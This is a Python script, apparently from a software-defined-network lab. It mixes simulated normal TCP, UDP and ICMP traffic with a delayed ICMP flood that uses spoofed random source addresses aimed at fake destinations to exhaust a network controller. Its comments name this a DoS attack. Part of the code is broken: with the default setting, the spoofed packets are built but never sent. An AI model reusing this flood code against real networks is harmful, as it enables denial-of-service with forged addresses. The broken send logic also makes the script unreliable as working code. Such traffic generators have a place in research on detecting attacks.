# -*- coding: utf-8 -*-
import socket
import math
import time
import random
import os
import socket
import struct
import array
from threading import Thread
from random import randint
from scapy.all import *

"""
    h5 and h15 as atttacker
    first send normal packet in thread, at the same time, 
    send a lot of packets with fake dst_ip to consum the controller resource. 
"""

TCP_server_ip = "10.0.0.1"
TCP_server_port = 8866
TCP_address = (TCP_server_ip, TCP_server_port)
UDP_server_ip = "10.0.0.10"
UDP_server_port = 9012
UDP_address = (UDP_server_ip, UDP_server_port)
# ON/OFF model param
alpha_ON = 1.5
alpha_OFF = 1.5
beta_ON = 1
beta_OFF = 1

class Pinger(object):
    def __init__(self, timeout=3):
        self.timeout = timeout
        self.receive_buff = 256
        self.__id = os.getpid() # get process id
        self.__data = struct.pack('h', 1)  # h代表2个字节与头部8个字节组成偶数可进行最短校验

    @property
    def __icmpSocket(self):  # 返回一个可以利用的icmp原对象,当做属性使用
        icmp = socket.getprotobyname("icmp")  # 指定服务
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)  # socket.SOCK_RAW原生包
        return sock

    def __doCksum(self, packet):  # 校验和运算
        words = array.array('h', packet)  # 将包分割成2个字节为一组的网络序列
        sum = 0
        for word in words:
            sum += (word & 0xffff)  # 每2个字节相加
        sum = (sum >> 16) + (sum & 0xffff)  # 因为sum有可能溢出16位所以将最高位和低位sum相加重复二遍
        sum += (sum >> 16)  # 为什么这里的sum不需要再 & 0xffff 因为这里的sum已经是16位的不会溢出,可以手动测试超过65535的十进制数字就溢出了
        return (~sum) & 0xffff  # 最后取反返回完成校验

    @property
    def __icmpPacket(self):  # icmp包的构造
        header = struct.pack('bbHHh', 8, 0, 0, self.__id, 0)
        packet = header + self.__data
        cksum = self.__doCksum(packet)
        header = struct.pack('bbHHh', 8, 0, cksum, self.__id, 0)  # 将校验带入原有包,这里才组成头部,数据部分只是用来做校验所以返回的时候需要返回头部和数据相加
        return header + self.__data

    def sendPing(self, target_host):
        send_bytes = 0
        recv_bytes = 0
        try:
            socket.gethostbyname(target_host)
            sock = self.__icmpSocket
            sock.settimeout(self.timeout)
            packet = self.__icmpPacket
            send_bytes = sock.sendto(packet, (target_host, 1))  # 发送icmp包

            recv_data, ip = sock.recvfrom(self.receive_buff)
            recv_bytes = len(recv_data)
        except Exception as e:
            sock.close()

        return send_bytes + recv_bytes

def TCP_client():
    receive_buffer = 256
    # create socket
    tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # connect to dst
    tcp_socket.connect(TCP_address)
    # send data
    send_data = 'TCP' + time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime(time.time()))
    send_bytes = tcp_socket.send(send_data.encode("utf-8"))
    print("TCP client send data:[%s]" % send_data)
    # receive data from dst,return string
    recv_data = tcp_socket.recv(receive_buffer)
    recv_bytes = len(recv_data)
    print("TCP client receive data:[%s]" % recv_data.decode("utf-8"))
    # close the socket
    tcp_socket.close()
    return send_bytes + recv_bytes

def UDP_client():
    receive_buffer = 256
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # send data
    send_data = 'UDP' + time.strftime('%Y-%m-%d-%H-%M-%S', time.localtime(time.time()))
    send_bytes = udp_socket.sendto(send_data.encode("utf-8"), UDP_address)
    print("UDP client send data:[%s]" % send_data)
    # receive data
    recv_data = udp_socket.recvfrom(receive_buffer)
    recv_bytes = len(recv_data)
    print("UDP client receive data:%s" % recv_data[0].decode("utf-8"))
    # close the socket
    udp_socket.close()
    return send_bytes + recv_bytes

def send_tcp(packet_num):
    all_send_packet = 0
    while all_send_packet < packet_num:
        u = random.uniform(0.0001, 1) # 产生(0,1)均匀分布
        send_packet = int(beta_ON / (math.pow(u, 1 / alpha_ON)))
        sleep_time = beta_OFF / (math.pow(u, 1 / alpha_OFF))
        for i in range(send_packet):
            # generate TCP data
            tcp_data_bytes = TCP_client()
            print("TCP client send and receive bytes:%d" % tcp_data_bytes)
        time.sleep(sleep_time)
        all_send_packet += send_packet
        # 每次ON/OFF模型结束，休息2s
        time.sleep(2)

def send_udp(packet_num):
    all_send_packet = 0
    while all_send_packet < packet_num:
        u = random.uniform(0.0001, 1) # 产生(0,1)均匀分布
        send_packet = int(beta_ON / (math.pow(u, 1 / alpha_ON)))
        sleep_time = beta_OFF / (math.pow(u, 1 / alpha_OFF))
        for i in range(send_packet):
            # generate UDP data
            udp_data_bytes = UDP_client()
            print("UDP client send and receive bytes:%d" % udp_data_bytes)
        time.sleep(sleep_time)
        all_send_packet += send_packet
        time.sleep(40)

def send_icmp(packet_num, host_num):
    all_send_packet = 0
    while all_send_packet < packet_num:
        u = random.uniform(0.0001, 1) # 产生(0,1)均匀分布
        send_packet = int(beta_ON / (math.pow(u, 1 / alpha_ON)))
        sleep_time = beta_OFF / (math.pow(u, 1 / alpha_OFF))
        ip_prefix = "10.0.0."
        for i in range(send_packet):
            # randomly select host ip
            ip_host = random.randint(0, host_num)
            host = ip_prefix + str(ip_host)
            print("ping %s" % host)
            ping = Pinger()
            icmp_data_bytes = ping.sendPing(host)
            print("ICMP send and receive bytes:%d" % icmp_data_bytes)
        time.sleep(sleep_time)
        all_send_packet += send_packet
        time.sleep(2000)

def random_src_ip():
    ip_part1 = randint(1, 255)
    ip_part2 = randint(1, 255)
    ip_part3 = randint(1, 255)
    ip_part4 = randint(1, 255)
    return str(ip_part1) + "." + str(ip_part2) + "." + str(ip_part3) + "." + str(ip_part4)

def random_dst_ip(host_num):
    ip_part4 = randint(host_num+1, 255)
    return "10.0.0." + str(ip_part4)

def ping_sendone(host, random_source=True):
    id_ip = randint(1, 65535)
    id_ping = randint(1, 65535)
    seq_ping = randint(1, 65535)
    if random_source == True:
        source_ip = random_src_ip()
        packet = IP(src=source_ip, dst=host, ttl=64, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b'welcome'*100
    else:
        packet = IP(dst=host, ttl=64, id=id_ip) / ICMP(id=id_ping, seq=seq_ping) / b'welcome'*100
        ping = send(packet, verbose=False)

def ping(host_num, packet_num, random_source=True):
    for i in range(packet_num):
        host = random_dst_ip(host_num)
        print("attacked host:%s" % host)
        if random_source == True:
            ping_sendone(host)
        else:
            ping_sendone(host, random_source=False)


if __name__ == '__main__':
    host_num = 15
    t_tcp = Thread(target=send_tcp, args=(20000,))
    t_tcp.start()
    t_udp = Thread(target=send_udp, args=(1000,))
    t_udp.start()
    t_icmp = Thread(target=send_icmp, args=(20, host_num))
    t_icmp.start()

    t_ping1 = Thread(target=ping, args=(host_num, 5000,))
    t_ping2 = Thread(target=ping, args=(host_num, 5000,))
    # after 1hours generating normal data, begin attack
    time.sleep(3600)
    print("starting ping attack.")
    t_ping1.start()
    t_ping2.start()

    if not t_tcp.is_alive():
        print("TCP packets are sending over.")
    if not t_udp.is_alive():
        print("UDP packets are sending over.")
    if not t_icmp.is_alive():
        print("ICMP packets are sending over.")
    if not (t_ping1.is_alive() and t_ping2.is_alive()):
        print("ping dos attact is over.")
